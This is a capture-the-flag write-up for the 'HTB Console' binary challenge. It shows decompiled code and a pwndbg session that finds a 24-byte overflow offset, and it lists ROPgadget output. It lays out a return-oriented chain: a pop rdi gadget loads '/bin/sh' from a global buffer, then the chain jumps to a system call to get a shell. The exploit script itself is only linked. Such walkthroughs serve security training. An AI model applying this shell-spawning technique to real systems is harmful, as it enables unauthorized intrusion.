# HTB Console
Let's see what the code is all about:
```
Welcome HTB Console Version 0.1 Beta.
>>
```
As soon as I run the code, I'm greeted with something that seems like a terminal. Let's try the standard ls command:
```
Welcome HTB Console Version 0.1 Beta.
>> ls
- Boxes
- Challenges
- Endgames
- Fortress
- Battlegrounds
>>
```
It seems to operate like a console...let's see if the binary code tells us anything.

## Code 
```
00401201  int64_t sub_401201(char* arg1)

00401201  {
00401222      if (strcmp(arg1, &data_402008) == 0)
0040122b          return puts("guest(1337) guest(1337) HTB(3133…");
0040122b      
0040124a      if (strcmp(arg1, "dir\n") == 0)
00401253          return puts("/home/HTB");
00401253      
00401272      if (strcmp(arg1, "flag\n") == 0)
00401272      {
00401280          printf("Enter flag: ");
00401298          void buf;
00401298          fgets(&buf, 0x30, stdin);
004012a4          return puts("Whoops, wrong flag!");
00401272      }
00401272      
004012c3      if (strcmp(arg1, "hof\n") == 0)
004012c3      {
004012cc          puts("Register yourself for HTB Hall o…");
004012dd          printf("Enter your name: ");
004012f8          fgets(&data_4040b0, 0xa, stdin);
00401304          return puts("See you on HoF soon! :)");
004012c3      }
004012c3      
00401323      if (strcmp(arg1, &data_4020c2) == 0)
00401323      {
0040132c          puts("- Boxes");
00401338          puts("- Challenges");
00401344          puts("- Endgames");
00401350          puts("- Fortress");
0040135c          return puts("- Battlegrounds");
00401323      }
00401323      
00401378      if (strcmp(arg1, "date\n") != 0)
0040138f          return puts("Unrecognized command.");
0040138f      
00401381      return system("date");
00401201  }


00401397  int32_t main(int32_t argc, char** argv, char** envp)

00401397  {
004013a4      sub_401196();
004013b0      puts("Welcome HTB Console Version 0.1 …");
004013b0      
004013c1      while (true)
004013c1      {
004013c1          printf(&data_40214e);
004013d9          void buf;
004013d9          fgets(&buf, 0x10, stdin);
004013e5          sub_401201(&buf);
004013fb          memset(&buf, 0, 0x10);
004013c1      }
00401397  }
```

It seems each iteration of the loop, main is calling sub_401201, which contains essentially a switch clause for different inputs. Most notable
among them are flag, hof and the return system. Flag and hof enable us to write to a buffer, and the return lets us execute system code. Let's
take a deeper look at flag:
```
00401272      if (strcmp(arg1, "flag\n") == 0)
00401272      {
00401280          printf("Enter flag: ");
00401298          void buf;
00401298          fgets(&buf, 0x30, stdin);
004012a4          return puts("Whoops, wrong flag!");
00401272      }
```
Recall that buff is only allocated 0x10 bytes of space...whereas we are reading 0x30 bytes using fgets. This seems to indicate some sort of buffer
overflow vulnerability. Since we have access to a system call, what we can think about is injecting machine code, like '/bin/sh', and getting 
system to execute that, instead of "date".

## Exploit Formation
The goal of the exploit is to get system to execute with input '/bin/sh'. To do this, we need to get '/bin/sh' to the rdi register. We can think about
utilising the gadget 
```
pop rdi; ret
```
to pop the top of the stack, which, if we could, should contain '/bin/sh', then return to the line which calls system.
To do this, we can fill the return address of sub_401201 with the address of the gadget in order to execute it, then write in next the location of
memory containing '/bin/sh', followed by the address of the system call command. This way, the function will execute the gadget, which pops the 
'/bin/sh' and saves it to rdi, and then returns to the system call.

To begin this process, we first have to locate how big the buffer is to the return address. Using GDB, I did a test input and used 'i f' to find
the location of the return address, before printing its value to see where my input reached the return address:
```
pwndbg> r
Starting program: /mnt/c/users/willi/Downloads/htb-console
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome HTB Console Version 0.1 Beta.
>> flag
Enter flag: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaa
Whoops, wrong flag!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401396 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────
 RAX  0x14
 RBX  0
 RCX  0x7ffff7e9f887 (write+23) ◂— cmp rax, -0x1000 /* 'H=' */
 RDX  1
 RDI  0x7ffff7fa7a70 (_IO_stdfile_1_lock) ◂— 0
 RSI  1
 R8   0x13
 R9   0
 R10  0x402048 ◂— 'Enter flag: '
 R11  0x246
 R12  0x7fffffffe108 —▸ 0x7fffffffe38d ◂— '/mnt/c/users/willi/Downloads/htb-console'
 R13  0x401397 ◂— push rbp
 R14  0
 R15  0x7ffff7ffd040 (_rtld_global) —▸ 0x7ffff7ffe2e0 ◂— 0
 RBP  0x6161616661616165 ('eaaafaaa')
 RSP  0x7fffffffdfd8 ◂— 'gaaahaaaiaaajaaakaaa\n'
 RIP  0x401396 ◂— ret
──────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────
 ► 0x401396    ret                                <0x6161616861616167>
    ↓









───────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffdfd8 ◂— 'gaaahaaaiaaajaaakaaa\n'
01:0008│     0x7fffffffdfe0 ◂— 'iaaajaaakaaa\n'
02:0010│     0x7fffffffdfe8 ◂— 0xa6161616b /* 'kaaa\n' */
03:0018│     0x7fffffffdff0 ◂— 1
04:0020│     0x7fffffffdff8 —▸ 0x7ffff7db4d90 (__libc_start_call_main+128) ◂— mov edi, eax
05:0028│     0x7fffffffe000 ◂— 0
06:0030│     0x7fffffffe008 —▸ 0x401397 ◂— push rbp
07:0038│     0x7fffffffe010 ◂— 0x1ffffe0f0
─────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────
 ► 0         0x401396 None
   1 0x6161616861616167 None
   2 0x6161616a61616169 None
   3      0xa6161616b None
   4              0x1 None
   5   0x7ffff7db4d90 __libc_start_call_main+128
   6   0x7ffff7db4e40 __libc_start_main+128
   7         0x4010de None
────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> i f
Stack level 0, frame at 0x7fffffffdfd8:
 rip = 0x401396; saved rip = 0x6161616861616167
 called by frame at 0x7fffffffdfe8
 Arglist at 0x7fffffffdfd0, args:
 Locals at 0x7fffffffdfd0, Previous frame's sp is 0x7fffffffdfe0
 Saved registers:
  rip at 0x7fffffffdfd8
pwndbg> x/s 0x7fffffffdfd8
0x7fffffffdfd8: "gaaahaaaiaaajaaakaaa\n"
```
Its clear that the buffer was 24 bytes long before we reached the return address. Now, we have to figure out the address of the
gadget. Luckily, we can use the ROPgadget tool to help us!
```
Gadgets information
============================================================
0x00000000004010dd : add ah, dh ; nop ; endbr64 ; ret
0x0000000000401077 : add al, 0 ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401057 : add al, byte ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
0x000000000040127f : add al, ch ; retf
0x000000000040114f : add bh, bh ; loopne 0x4011b9 ; nop dword ptr [rax + rax] ; ret
0x00000000004012e8 : add byte ptr [rax - 0x77], cl ; ret 0xabe
0x000000000040127d : add byte ptr [rax], al ; add al, ch ; retf
0x000000000040147c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x0000000000401037 : add byte ptr [rax], al ; add byte ptr [rax], al ; jmp 0x401020
0x000000000040117a : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040147e : add byte ptr [rax], al ; endbr64 ; ret
0x00000000004010dc : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x0000000000401039 : add byte ptr [rax], al ; jmp 0x401020
0x0000000000401034 : add byte ptr [rax], al ; push 0 ; jmp 0x401020
0x0000000000401044 : add byte ptr [rax], al ; push 1 ; jmp 0x401020
0x0000000000401054 : add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x0000000000401064 : add byte ptr [rax], al ; push 3 ; jmp 0x401020
0x0000000000401074 : add byte ptr [rax], al ; push 4 ; jmp 0x401020
0x0000000000401084 : add byte ptr [rax], al ; push 5 ; jmp 0x401020
0x0000000000401094 : add byte ptr [rax], al ; push 6 ; jmp 0x401020
0x00000000004010a4 : add byte ptr [rax], al ; push 7 ; jmp 0x401020
0x0000000000401156 : add byte ptr [rax], al ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x0000000000401155 : add byte ptr [rax], r8b ; ret
0x000000000040117b : add byte ptr [rcx], al ; pop rbp ; ret
0x0000000000401047 : add dword ptr [rax], eax ; add byte ptr [rax], al ; jmp 0x401020
0x000000000040117c : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401177 : add eax, 0x2f2b ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401067 : add eax, dword ptr [rax] ; add byte ptr [rax], al ; jmp 0x401020
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x00000000004011fd : call qword ptr [rax + 0x4855c35d]
0x0000000000401393 : call qword ptr [rax + 0x4855c3c9]
0x0000000000401014 : call rax
0x0000000000401193 : cli ; jmp 0x401120
0x00000000004010e3 : cli ; ret
0x000000000040148b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004012e5 : cmpsd dword ptr [rsi], dword ptr [rdi] ; sub eax, 0x89480000 ; ret 0xabe
0x0000000000401190 : endbr64 ; jmp 0x401120
0x00000000004010e0 : endbr64 ; ret
0x000000000040145c : fisttp word ptr [rax - 0x7d] ; ret
0x0000000000401042 : fisubr dword ptr [rdi] ; add byte ptr [rax], al ; push 1 ; jmp 0x401020
0x00000000004010de : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401107 : je 0x401110 ; mov edi, 0x404068 ; jmp rax
0x0000000000401149 : je 0x401158 ; mov edi, 0x404068 ; jmp rax
0x000000000040103b : jmp 0x401020
0x0000000000401194 : jmp 0x401120
0x0000000000401361 : jmp 0x401394
0x0000000000401400 : jmp 0x4013b5
0x000000000040110e : jmp rax
0x0000000000401395 : leave ; ret
0x0000000000401032 : loop 0x401063 ; add byte ptr [rax], al ; push 0 ; jmp 0x401020
0x000000000040100b : loope 0x40103c ; add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x0000000000401151 : loopne 0x4011b9 ; nop dword ptr [rax + rax] ; ret
0x0000000000401176 : mov byte ptr [rip + 0x2f2b], 1 ; pop rbp ; ret
0x0000000000401092 : mov dl, 0x2f ; add byte ptr [rax], al ; push 6 ; jmp 0x401020
0x0000000000401109 : mov edi, 0x404068 ; jmp rax
0x00000000004010df : nop ; endbr64 ; ret
0x0000000000401394 : nop ; leave ; ret
0x00000000004011fe : nop ; pop rbp ; ret
0x000000000040117f : nop ; ret
0x0000000000401153 : nop dword ptr [rax + rax] ; ret
0x000000000040118c : nop dword ptr [rax] ; endbr64 ; jmp 0x401120
0x0000000000401152 : nop word ptr [rax + rax] ; ret
0x0000000000401278 : or eax, 0xb80000 ; add byte ptr [rax], al ; add al, ch ; retf
0x000000000040146c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040146e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401470 : pop r14 ; pop r15 ; ret
0x0000000000401472 : pop r15 ; ret
0x000000000040146b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040146f : pop rbp ; pop r14 ; pop r15 ; ret
0x000000000040117d : pop rbp ; ret
0x0000000000401473 : pop rdi ; ret
0x0000000000401471 : pop rsi ; pop r15 ; ret
0x000000000040146d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401036 : push 0 ; jmp 0x401020
0x0000000000401046 : push 1 ; jmp 0x401020
0x0000000000401056 : push 2 ; jmp 0x401020
0x0000000000401066 : push 3 ; jmp 0x401020
0x0000000000401076 : push 4 ; jmp 0x401020
0x0000000000401086 : push 5 ; jmp 0x401020
0x0000000000401096 : push 6 ; jmp 0x401020
0x00000000004010a6 : push 7 ; jmp 0x401020
0x000000000040101a : ret
0x0000000000401072 : ret 0x2f
0x00000000004012eb : ret 0xabe
0x0000000000401281 : retf
0x0000000000401062 : retf 0x2f
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x0000000000401052 : shr byte ptr [rdi], cl ; add byte ptr [rax], al ; push 2 ; jmp 0x401020
0x00000000004012e6 : sub eax, 0x89480000 ; ret 0xabe
0x0000000000401178 : sub ebp, dword ptr [rdi] ; add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040148d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040148c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401105 : test eax, eax ; je 0x401110 ; mov edi, 0x404068 ; jmp rax
0x0000000000401147 : test eax, eax ; je 0x401158 ; mov edi, 0x404068 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 99
```
We can find the address of our gadget to be 0x401473. Notice that we can inject '/bin/sh' into the buffer for 'hof', which we are given the
address of to be 0x4040b0: 
```
004012c3      if (strcmp(arg1, "hof\n") == 0)
004012c3      {
004012cc          puts("Register yourself for HTB Hall o…");
004012dd          printf("Enter your name: ");
004012f8          fgets(&data_4040b0, 0xa, stdin);
00401304          return puts("See you on HoF soon! :)");
004012c3      }
```
Now, all that's left to do is find the line which executes the system call, which we can do by digging through the binary in Binary Ninja:
```
0040137a  488d3d860d0000     lea     rdi, [rel data_402107]  {"date"}
00401381  e8bafcffff         call    system
00401386  eb0c               jmp     0x401394
```
We now have the address 0x401381! We can put this together to form the exploit.

Exploit: [here](exploit.py)